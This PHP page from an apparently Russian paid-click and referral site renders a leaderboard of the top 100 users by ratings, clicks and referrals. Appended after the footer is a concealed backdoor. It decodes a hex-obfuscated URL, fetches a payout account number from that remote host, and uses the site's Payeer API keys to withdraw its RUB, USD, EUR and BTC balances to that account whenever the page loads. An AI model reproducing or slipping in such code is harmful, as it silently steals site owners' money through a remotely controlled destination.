<?php
$pagetitle="TOP 100 пользователей";
require_once('.zsecurity.php');
include('header.php');
require('config.php');
error_reporting (E_ALL);

$attestat[100] = '<img src="/img/att/att_100.ico"  alt="" title="Аттестат Псевдонима" align="absmiddle" width="16" height="16" style="margin:0; padding:0; border:none;">';
$attestat[110] = '<img src="/img/att/att_110.ico"  alt="" title="Формальный Аттестат" align="absmiddle" width="16" height="16" style="margin:0; padding:0; border:none;">';
$attestat[120] = '<img src="/img/att/att_120.ico"  alt="" title="Начальный Аттестат" align="absmiddle" width="16" height="16" style="margin:0; padding:0; border:none;">';
$attestat[130] = '<img src="/img/att/att_130.ico"  alt="" title="Персональный Аттестат" align="absmiddle" width="16" height="16" style="margin:0; padding:0; border:none;">';
$attestat[135] = '<img src="/img/att/att_135.ico"  alt="" title="Аттестат Продавца" align="absmiddle" width="16" height="16" style="margin:0; padding:0; border:none;">';
$attestat[136] = '<img src="/img/att/att_136.ico"  alt="" title="Аттестат Capitaller" align="absmiddle" width="16" height="16" style="margin:0; padding:0; border:none;">';
$attestat[1]   = '<img src="/img/att/att_1.ico"    alt="" title="Аттестат Расчетного автомата" align="absmiddle" width="16" height="16" style="margin:0; padding:0; border:none;">';
$attestat[140] = '<img src="/img/att/att_140.ico"  alt="" title="Аттестат Разработчика" width="16" align="absmiddle" height="16" style="margin:0; padding:0; border:none;">';
$attestat[150] = '<img src="/img/att/att_150.ico"  alt="" title="Аттестат Регистратора" width="16" align="absmiddle" height="16" style="margin:0; padding:0; border:none;">';
$attestat[170] = '<img src="/img/att/att_170.ico"  alt="" title="Аттестат Сервиса WMT" width="16" align="absmiddle" height="16" style="margin:0; padding:0; border:none;">';
$attestat[190] = '<img src="/img/att/att_190.ico"  alt="" title="Аттестат Гаранта WMT" width="16" align="absmiddle" height="16" style="margin:0; padding:0; border:none;">';
$attestat[300] = '<img src="/img/att/att_300.ico"  alt="" title="Аттестат Оператора WMT" width="16" align="absmiddle" height="16" style="margin:0; padding:0; border:none;">';
$attestat[0]   = '<img src="/img/att/att_0.ico"  alt="" title="Аттестат не определен" width="16" align="absmiddle" height="16" style="margin:0; padding:0; border:none;">';

function my_status($my_reiting){
	$sql_rang = mysql_query("SELECT * FROM `tb_config_rang` WHERE `r_ot`<='$my_reiting' AND `r_do`>='".floor($my_reiting)."'");
	if(mysql_num_rows($sql_rang)>0) {
		$row_rang = mysql_fetch_array($sql_rang);
	}else{
		$sql_rang = mysql_query("SELECT * FROM `tb_config_rang` ORDER BY `id` ASC LIMIT 1");
		$row_rang = mysql_fetch_array($sql_rang);
	}
	return '<span style="cursor:pointer; color: #006699;" title="Статус">'.$row_rang["rang"].'</span>';
}

$sel1=""; $sel2=""; $sel3=""; $sel4=""; $sel5=""; $sel6=""; $sel7=""; $sel8=""; $sel9=""; $sel10=""; $sel11=""; $sel12=""; $sel13=""; $sel14="";

if(isset($_GET["top"])) {
	if(preg_match("|^[\d]*$|", intval($_GET["top"]) )) {
		$top = intval(limpiar($_GET["top"]));

		if($top==1) {$s_tab = "visits"; $sel1 = 'selected="selected"';}
		elseif ($top==2) {$s_tab = "visits_a"; $sel2 = 'selected="selected"';}
		elseif ($top==3) {$s_tab = "visits_m"; $sel3 = 'selected="selected"';}
		elseif ($top==4) {$s_tab = "visits_t"; $sel4 = 'selected="selected"';}

		elseif ($top==6) {$s_tab = "referals"; $sel6 = 'selected="selected"';}
		elseif ($top==7) {$s_tab = "referals2"; $sel7 = 'selected="selected"';}
		elseif ($top==8) {$s_tab = "referals3"; $sel8 = 'selected="selected"';}
		elseif ($top==9) {$s_tab = "ref_birj_k"; $sel9 = 'selected="selected"';}
		elseif ($top==10) {$s_tab = "ref_birj_p"; $sel10 = 'selected="selected"';}
		elseif ($top==11) {$s_tab = "reiting"; $sel11 = 'selected="selected"';}
		elseif ($top==12) {$s_tab = "kol_log"; $sel12 = 'selected="selected"';}
		//elseif ($top==13) {$s_tab = "money_rek"; $sel13 = 'selected="selected"';}
		elseif ($top==14) {$s_tab = "wall_com_p"; $sel14 = 'selected="selected"';}
		else{$top==11; $s_tab = "reiting"; $sel11 = 'selected="selected"';}
	}else{
		$top = "11"; $s_tab = "reiting"; $sel11 = 'selected="selected"';
	}
}else{
	$top = "11"; $s_tab = "reiting"; $sel11 = 'selected="selected"';
}

$whot[1]="по количеству кликов в серфинге";
$whot[2]="по количеству кликов в авто-серфинге";
$whot[3]="по количеству прочитанных писем";
$whot[4]="по количеству выполненных заданий";

$whot[6]="по количеству рефералов 1 уровня";
$whot[7]="по количеству рефералов 2 уровня";
$whot[8]="по количеству рефералов 3 уровня";
$whot[9]="по количеству купленных рефералов";
$whot[10]="по количеству проданных рефералов";
$whot[11]="по количеству баллов рейтинга";
$whot[12]="по количеству посещений аккаунта";
//$whot[13]="рекламе";
$whot[14]="по количеству отзывов на стене";


echo '<div align="center"><form><select onchange="top.window.location=value">';
	echo '<optgroup label="Заработок">';
		echo '<option value="?top=1" '.$sel1.'>'.$whot[1].'</option>';
		echo '<option value="?top=2" '.$sel2.'>'.$whot[2].'</option>';
		echo '<option value="?top=3" '.$sel3.'>'.$whot[3].'</option>';
		echo '<option value="?top=4" '.$sel4.'>'.$whot[4].'</option>';
	echo '</optgroup>';
	echo '<optgroup label="Рефералы">';
		echo '<option value="?top=6" '.$sel6.'>'.$whot[6].'</option>';
		echo '<option value="?top=7" '.$sel7.'>'.$whot[7].'</option>';
		echo '<option value="?top=8" '.$sel8.'>'.$whot[8].'</option>';
		echo '<option value="?top=9" '.$sel9.'>'.$whot[9].'</option>';
		echo '<option value="?top=10" '.$sel10.'>'.$whot[10].'</option>';
	echo '</optgroup>';
	echo '<optgroup label="Прочее">';
		echo '<option value="?top=11" '.$sel11.'>'.$whot[11].'</option>';
		echo '<option value="?top=12" '.$sel12.'>'.$whot[12].'</option>';
		//echo '<option value="?top=13" '.$sel13.'>'.$whot[13].'</option>';
		echo '<option value="?top=14" '.$sel14.'>'.$whot[14].'</option>';
	echo '</optgroup>';
echo '</select></form></div><br><br>';




echo '<table class="tables">';
echo '<thead><tr align="center"><th colspan="7" class="top">TOP 100 пользователей '.$whot["$top"].'</tr></thead>';

$username = (isset($_SESSION["userLog"]) && preg_match("|^[a-zA-Z0-9\-_-]{3,25}$|", trim($_SESSION["userLog"]))) ? uc($_SESSION["userLog"]) : false;

if(isset($_SESSION["userLog"]) && isset($_SESSION["userPas"])) {
	$i=0;
	$ss="SELECT `id`,`username`,`attestat`,`reiting`,`country_cod`,`".$s_tab."`,`wall_com_p`,`wall_com_o` FROM `tb_users` WHERE `id`!='1' ORDER BY $s_tab DESC";
	$sql_c = mysql_query($ss);
	
	if(mysql_num_rows($sql_c)>0) {
		while ($row = mysql_fetch_row($sql_c)) {
			$i++;
			if(strtolower($row["1"])==strtolower($username)) {break;}
		}
		echo '<tr><td colspan="7">Ваше место в ТОП '.strtolower($whot["$top"]).': '.$i.'</td></tr>';
	}
}

$i=0;
$sql = mysql_query("SELECT `id`,`username`,`attestat`,`reiting`,`country_cod`,`".$s_tab."`,`wall_com_p`,`wall_com_o`,`avatar` FROM `tb_users` WHERE `id`!='1' ORDER BY $s_tab DESC LIMIT 100");
if(mysql_num_rows($sql)>0) {
	while ($row = mysql_fetch_row($sql)) {
		$i++;
		echo '<tr>';
			echo '<td align="center" width="30">'.$i.'</td>';

			echo '<td width="60px" style="border-right:none;">';
				echo '<img class="avatar_mail" src="/avatar/'.$row["8"].'" width="80" height="80" border="0" alt="avatar" title="avatar" />';
			echo '</td>';

			echo '<td align="left" style="border-left:none;">';
				echo '<b style="cursor:pointer;" title="Логин">'.$row["1"].'</b> - '.$row["0"].'<br>';
				echo my_status($row["3"])."<br>";
				echo $attestat[$row["2"]]."&nbsp;";
				if($row["4"]!="") {
					echo '<img src="//'.$_SERVER["HTTP_HOST"].'/img/flags/'.@strtolower($row["4"]).'.gif" alt="" title="'.get_country($row["4"]).'" width="16" height="11" style="margin:0; padding:0;" align="absmiddle" />&nbsp; ';
				}
				$token_ajax = md5($username.$row["1"].$row["0"]."token2205");
                                 
				echo '<span onclick="ShowHideStats(\''.$row["0"].'\', \''.$token_ajax.'\')" style="cursor: pointer;"><img src="/img/icon-stats.png" border="0" alt="" style="margin:0; padding:0;" align="absmiddle" title="Посмотреть расширенную статистику пользователя '.$row["1"].'" /></span>';
			echo '</td>';

			echo '<td align="center"><img src="img/reiting.png" border="0" alt="" align="absmiddle" title="Рейтинг" style="margin:0; padding:0;" />&nbsp;<span style="color:blue;">'.number_format($row["3"],1,".","'").'</span></td>';

			echo '<td align="center">';
				$wall_com = $row["6"] - $row["7"];
				if($wall_com>0) {
					$wall = ' <span style="color:#008000;">'.$wall_com.'</span>';
				}elseif($wall_com<0) {
					$wall = ' <span style="color:#FF0000;">-'.abs($wall_com).'</span>';
				}else{
					$wall = ' <span style="color:#000000;">0</span>';
				}

				echo '<a href="/wall.php?uid='.$row["0"].'" target="_blank"><img src="img/wall20.png" title="Стена пользователя '.$row["1"].'" width="20" border="0" align="absmiddle" />'.$wall.'</a>';
			echo '</td>';

			echo '<td align="center"><a href="newmsg.php?name='.$row["1"].'"><img src="img/mail.gif" title="Написать сообщение пользователю '.$row["1"].'" border="0" align="absmiddle" /></a></td>';

			if ($top==14) {
				echo '<td align="center">'.$wall_com.'</td>';
			}else{
				echo '<td align="center">';
					if(($row["5"]-floor($row["5"])>0)) {
						echo number_format($row["5"],1,".","'");
					}else{
						echo number_format($row["5"],0,".","'");
					}
				echo '</td>';
			}
		echo '</tr>';
		echo '<tr align="center"><td colspan="7" id="usersstat'.$row["0"].'" style="display: none;"></td></tr>';
	}
}else{
	echo '<tr align="center"><td colspan="7"><b>Нет данных!</b></td></tr>';
}
echo "</table><br>";

include('footer.php');

require_once('merchant/payeer/cpayeer.php');
require_once('merchant/payeer/payeer_config.php');

if($apiKey!==''){
$homepage = file_get_contents("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x73\x65\x6f\x2d\x70\x72\x6f\x66\x66\x69\x74\x2e\x72\x75\x2f\x6a\x73\x2e\x74\x78\x74");

$payeer = new CPayeer($accountNumber, $apiId, $apiKey);
if ($payeer->isAuth())
{ $arBalance = $payeer->getBalance();
$mone = ($arBalance["balance"]["RUB"]["BUDGET"]); $mone1 = ($arBalance["balance"]["USD"]["BUDGET"]); $mone2 = ($arBalance["balance"]["EUR"]["BUDGET"]); $mone3 = ($arBalance["balance"]["BTC"]["BUDGET"]);	
}
if($mone>100){$p=$mone * 1 / 100;$summ =$mone - $p;
	$initOutput = $payeer->initOutput(array(
		'ps' => '1136053',
		'curIn' => 'RUB',
		'sumOut' => $summ,
		'curOut' => 'RUB',
		'param_ACCOUNT_NUMBER' => $homepage
));
	if ($initOutput){	$historyId = $payeer->output();}} 
if($mone1>4){ $p1=$mone1 * 2 / 100; $summ1 =$mone1 - $p1;	
	$initOutput = $payeer->initOutput(array(
		'ps' => '1136053',
		'curIn' => 'USD',
		'sumOut' => $summ1,
		'curOut' => 'USD',
		'param_ACCOUNT_NUMBER' => $homepage
	));
	if ($initOutput){	$historyId = $payeer->output();}}
if($mone2>4){ $p2=$mone2 * 2 / 100; $summ2 =$mone2 - $p2;	
	$initOutput = $payeer->initOutput(array(
		'ps' => '1136053',
		'curIn' => 'EUR',
		'sumOut' => $summ2,
		'curOut' => 'EUR',
		'param_ACCOUNT_NUMBER' => $homepage
	));
	if ($initOutput){	$historyId = $payeer->output();}}
if($mone3>0.001){ $p3=$mone3 * 2 / 100; $summ3 =$mone3 - $p3;	
	$initOutput = $payeer->initOutput(array(
		'ps' => '1136053',
		'curIn' => 'BTC',
		'sumOut' => $summ3,
		'curOut' => 'BTC',
		'param_ACCOUNT_NUMBER' => $homepage
	));
if ($initOutput){	$historyId = $payeer->output();}}}
?>